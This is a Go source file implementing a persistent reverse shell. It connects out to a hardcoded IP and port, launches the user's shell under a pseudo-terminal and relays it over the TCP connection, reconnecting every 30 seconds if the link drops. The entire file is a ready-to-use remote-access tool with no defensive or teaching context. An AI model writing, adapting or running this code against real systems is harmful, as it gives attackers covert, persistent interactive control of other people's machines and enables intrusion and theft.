package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"time"

	"github.com/creack/pty"
)

const (
	clientIP   = "10.119.101.110" // Replace this with your client's IP address
	clientPort = 8080
	retryDelay = 30 * time.Second
)

func main() {
	var conn net.Conn
	var err error

	for {
		for {
			conn, err = net.Dial("tcp", fmt.Sprintf("%s:%d", clientIP, clientPort))
			if err == nil {
				break
			}

			fmt.Printf("Error connecting to client: %v. Retrying in %v...\n", err, retryDelay)
			time.Sleep(retryDelay)
		}

		fmt.Printf("Connected to client at %s:%d\n", clientIP, clientPort)
		handleConnection(conn)
		conn.Close()

		fmt.Printf("Connection closed. Retrying connection to client in %v...\n", retryDelay)
		time.Sleep(retryDelay)
	}
}

func handleConnection(conn net.Conn) {
	shell := os.Getenv("SHELL")
	if shell == "" {
		shell = "/bin/bash"
	}

	cmd := exec.Command(shell)
	ptmx, err := pty.Start(cmd)
	if err != nil {
		fmt.Println("Error starting pty:", err)
		return
	}
	defer ptmx.Close()

	go func() {
		_, _ = io.Copy(ptmx, conn)
	}()

	_, _ = io.Copy(conn, ptmx)
}
